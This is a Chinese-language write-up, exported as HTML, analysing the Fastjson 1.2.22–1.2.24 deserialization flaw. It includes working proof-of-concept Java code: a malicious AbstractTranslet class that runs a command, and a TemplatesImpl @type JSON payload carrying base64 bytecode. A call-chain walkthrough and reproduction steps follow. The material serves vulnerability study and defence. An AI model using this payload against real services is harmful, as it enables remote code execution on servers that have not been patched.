<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="fastjson-1222---1224-反序列化漏洞"><span class="csDE05BCC">Fastjson 1.2.22 - 1.2.24 </span><span class="csECDA2D3">反序列化漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Fastjson 1.2.22-24</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="X5d7356620c9f60062d7854f1fdf3c3fcf5464ae"><span class="csD1E291E2">0x01 </span><span class="csD6CA00D2">简单介绍</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">介绍：</span><span class="cs8926E06">FastJson</span><span class="cs9C1B1871">是一款由阿里开发的</span><span class="cs8926E06">JSON</span><span class="cs9C1B1871">库</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">影响版本：</span><span class="cs8926E06">1.2.22-24<br/></span><span class="cs9C1B1871">官方通告：</span><span class="cs8926E06">https://github.com/alibaba/fastjson/wiki/security_update_20170315<br/></span><span class="cs9C1B1871">补丁：</span><span class="cs8926E06">https://github.com/alibaba/fastjson/commit/d075721cf396d5cb70e24c824b901e3a9a5b342b</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">本地环境：</span><span class="cs8926E06"><br/>win10<br/>idea64 2018.2.5<br/>jdk 1.8<br/>fastjson 1.22</span></p><h4 class="cs868C439D">
			<a name="fastjson的简单使用"><span class="csBF12A472">FastJson</span><span class="cs6EDCDAE2">的简单使用</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">先通过一个简单的</span><span class="cs8926E06">demo</span><span class="cs9C1B1871">来熟悉一下</span><span class="cs8926E06">FastJson</span><span class="cs9C1B1871">的基本操作。首先创建一个</span><span class="cs8926E06">Student</span><span class="cs9C1B1871">类，</span><span class="cs8926E06">Student.java</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">package ka1n4t.test;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class Student {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public String name;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;private int age;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public String getName() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return name;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void setName(String name) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.name = name;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public int getAge() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return age;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void setAge(int age) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.age = age;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Students</span><span class="cs9C1B1871">有一个公有属性</span><span class="cs8926E06">name</span><span class="cs9C1B1871">和一个私有属性</span><span class="cs8926E06">age</span><span class="cs9C1B1871">。下面使用一个测试类，将</span><span class="cs8926E06">json</span><span class="cs9C1B1871">字符串反序列化成</span><span class="cs8926E06">Student</span><span class="cs9C1B1871">对象，</span><span class="cs8926E06">learnFJ.java</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">package ka1n4t.test;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">import com.alibaba.fastjson.JSON;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.alibaba.fastjson.parser.Feature;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.alibaba.fastjson.JSONObject;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class learnFJ {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void main(String args[]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String text = &quot;{\&quot;@type\&quot;:\&quot;ka1n4t.test.Student\&quot;,\&quot;name\&quot;:\&quot;ZhangSan\&quot;,\&quot;age\&quot;:123}&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Student obj1 = JSON.parseObject(text, Student.class, Feature.SupportNonPublicField);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(obj1.getName());</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">结果：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image0.png" width="520" height="279" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="X65b0b5fa7f01d19330a181e66afc2c974c8014d"><span class="csD1E291E2">0x02 </span><span class="csD6CA00D2">原理分析</span></a></h3>
		<h4 class="cs868C439D">
			<a name="分析poc"><span class="cs6EDCDAE2">分析</span><span class="csBF12A472">POC</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">先看一下用于反序列化的恶意类</span><span class="cs8926E06">evilClass1.java:</span></p><p class="cs3A447A38"><span class="cs9FB05234">package ka1n4t.poc;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import java.io.IOException;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class evilClass1 extends AbstractTranslet/*ka1n4t*/ {</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public evilClass1() throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Runtime.getRuntime().exec(&quot;calc&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void main(String[] args) throws IOException {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;evilClass1 helloworld = new evilClass1();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">其中的构造方法是用</span><span class="cs8926E06">exec</span><span class="cs9C1B1871">弹个计算器。看下</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">，</span><span class="cs8926E06">vulApp1.java</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">package ka1n4t.poc;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import org.apache.commons.io.IOUtils;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import org.apache.commons.codec.binary.Base64;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.alibaba.fastjson.JSON;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.alibaba.fastjson.parser.Feature;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import com.alibaba.fastjson.parser.ParserConfig;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.ByteArrayOutputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.File;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.FileInputStream;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import java.io.IOException;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">public class vulApp1 {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static String readClass(String cls){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ByteArrayOutputStream bos = new ByteArrayOutputStream();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IOUtils.copy(new FileInputStream(new File(cls)), bos);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} catch (IOException e) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String result = Base64.encodeBase64String(bos.toByteArray());</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return result;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void bad_method() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ParserConfig config = new ParserConfig();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final String fileSeparator = System.getProperty(&quot;file.separator&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String evil_path = &quot;D:\\Java-App\\fastjson-1.2.22\\target\\classes\\ka1n4t\\poc\\evilClass1.class&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String evil_code = readClass(evil_path);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final String NASTY_CLASS = &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String text1 = &quot;{\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evil_code+&quot;\&quot;],&quot; +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&#39;_name&#39;:&#39;a.b&#39;,&quot; +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&#39;_tfactory&#39;:{ },&quot; +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\&quot;_outputProperties\&quot;:{ }}\n&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(text1);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;public static void main(String args[]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bad_method();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">核心部分：</span></p><p class="cs3A447A38"><span class="cs9FB05234">String text1 = &quot;{\&quot;@type\&quot;:\&quot;&quot; + NASTY_CLASS +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;+evil_code+&quot;\&quot;],&quot; +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&#39;_name&#39;:&#39;a.b&#39;,&quot; +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&#39;_tfactory&#39;:{ },&quot; +</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\&quot;_outputProperties\&quot;:{ }}\n&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span></p><p class="cs40DD2BC9"><span class="cs8926E06">_bytecodes</span><span class="cs9C1B1871">是经过</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">编码的</span><span class="cs8926E06">evilClass1</span><span class="cs9C1B1871">的字节码文件，</span><span class="cs8926E06">NASTY_CLASS</span><span class="cs9C1B1871">是</span><span class="cs8926E06">TemplatesImpl</span><span class="cs9C1B1871">类。总结一下这个</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">，利用</span><span class="cs8926E06">JSON.parseObject</span><span class="cs9C1B1871">反序列化</span><span class="cs8926E06">TemplatesImpl</span><span class="cs9C1B1871">类，其中</span><span class="cs8926E06">_bytecodes</span><span class="cs9C1B1871">属性是经过</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">编码的恶意类字节码文件。</span></p><h4 class="cs868C439D">
			<a name="调试分析"><span class="cs6EDCDAE2">调试分析</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">下面来分析一下反序列化</span><span class="cs8926E06">TemplatesImpl</span><span class="cs9C1B1871">的调用链，首先经过</span><span class="cs8926E06">java</span><span class="cs9C1B1871">的反射机制，到达</span><span class="cs8926E06">TemplatesImpl</span><span class="cs9C1B1871">类，调用其</span><span class="cs8926E06">getOutputProperties()</span><span class="cs9C1B1871">方法：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="295" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="286" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06">newTransformer()</span><span class="cs9C1B1871">方法，这个方法是用于创建一个</span><span class="cs8926E06">Transformer</span><span class="cs9C1B1871">实例。然后到达</span><span class="cs8926E06">getTransletInstance()</span><span class="cs9C1B1871">方法：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image3.png" width="560" height="296" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">getTransletInstance()</span><span class="cs9C1B1871">方法用于创建一个</span><span class="cs8926E06">translet</span><span class="cs9C1B1871">实例，返回这个</span><span class="cs8926E06">translet</span><span class="cs9C1B1871">给</span><span class="cs8926E06">newTransformer()</span><span class="cs9C1B1871">，然后被包裹成</span><span class="cs8926E06">Transformer</span><span class="cs9C1B1871">对象。跟进一下这个方法，发现其调用了</span><span class="cs8926E06">defineTransletClasses()</span><span class="cs9C1B1871">用来加载</span><span class="cs8926E06">_bytecodes</span><span class="cs9C1B1871">中的类，接着又调用了</span><span class="cs8926E06">_class[_transletIndex].newInstance()</span><span class="cs9C1B1871">将</span><span class="cs8926E06">defineTransletClasses()</span><span class="cs9C1B1871">返回的类进行实例化：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image4.png" width="560" height="294" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">先跟进一下</span><span class="cs8926E06">defineTransletClasses</span><span class="cs9C1B1871">方法：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image5.png" width="560" height="294" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，使用了</span><span class="cs8926E06">loader.defineClass()</span><span class="cs9C1B1871">方法用于加载</span><span class="cs8926E06">_bytecodes</span><span class="cs9C1B1871">的内容，并将返回的类赋值给</span><span class="cs8926E06">_class[i]</span><span class="cs9C1B1871">（这里的</span><span class="cs8926E06">i</span><span class="cs9C1B1871">是</span><span class="cs8926E06">0</span><span class="cs9C1B1871">）。</span><span class="cs8926E06">loader</span><span class="cs9C1B1871">是</span><span class="cs8926E06">TemplatesImpl</span><span class="cs9C1B1871">自定义的类，跟进一下：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image6.png" width="560" height="461" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到</span><span class="cs8926E06">TransletClassLoader</span><span class="cs9C1B1871">继承了</span><span class="cs8926E06">Java</span><span class="cs9C1B1871">类加载器</span><span class="cs8926E06">&mdash;ClassLoader</span><span class="cs9C1B1871">类，跟进其</span><span class="cs8926E06">defineClass</span><span class="cs9C1B1871">方法，发现直接调用了父类</span><span class="cs8926E06">ClassLoader</span><span class="cs9C1B1871">中的方法，所以就不再跟进了。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">回到</span><span class="cs8926E06">defineTransletClasses</span><span class="cs9C1B1871">方法，其间接调用</span><span class="cs8926E06">ClassLoader</span><span class="cs9C1B1871">加载</span><span class="cs8926E06">_bytecodes</span><span class="cs9C1B1871">中的内容之后，将加载出来的类赋值给</span><span class="cs8926E06">_class[0]</span><span class="cs9C1B1871">，然后结束，回到</span><span class="cs8926E06">getTransletInstance</span><span class="cs9C1B1871">方法，再看一下图：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image7.png" width="560" height="294" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到，</span><span class="cs8926E06">455</span><span class="cs9C1B1871">行直接使用了</span><span class="cs8926E06">_class[0].newInstance()</span><span class="cs9C1B1871">创建实例，创建的过程中调用了</span><span class="cs8926E06">evilClass1</span><span class="cs9C1B1871">构造方法，然后触发了</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image8.png" width="560" height="292" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="Xeecc89ee3b68ce04283fa90aaa2147dbebf3d38"><span class="csD1E291E2">0x03 </span><span class="csD6CA00D2">复现过程</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">从</span><span class="cs8926E06">github</span><span class="cs9C1B1871">上直接</span><span class="cs8926E06">pull</span><span class="cs9C1B1871">下</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">：</span><span class="cs8926E06">https://github.com/ianxtianxt/fastjson-remote-code-execute-poc </span><span class="cs9C1B1871">使用</span><span class="cs8926E06">idea</span><span class="cs9C1B1871">打开工程，编译</span><span class="cs8926E06">test.java</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image9.png" width="560" height="413" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">然后会在</span><span class="cs8926E06">target/classes/person</span><span class="cs9C1B1871">下生成</span><span class="cs8926E06">test.class</span><span class="cs9C1B1871">文件。用同样的方法编译</span><span class="cs8926E06">Poc.java</span><span class="cs9C1B1871">。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="543" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">配置运行方式</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image11.png" width="560" height="729" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">运行</span><span class="cs8926E06">Poc</span><span class="cs9C1B1871">：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image12.png" width="560" height="359" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Fastjson/Fastjson%201.2.22%20-%201.2.24%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e_files/image13.png" width="560" height="350" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.cnblogs.com/litlife/p/9986427.html</span></p></body>
</html>
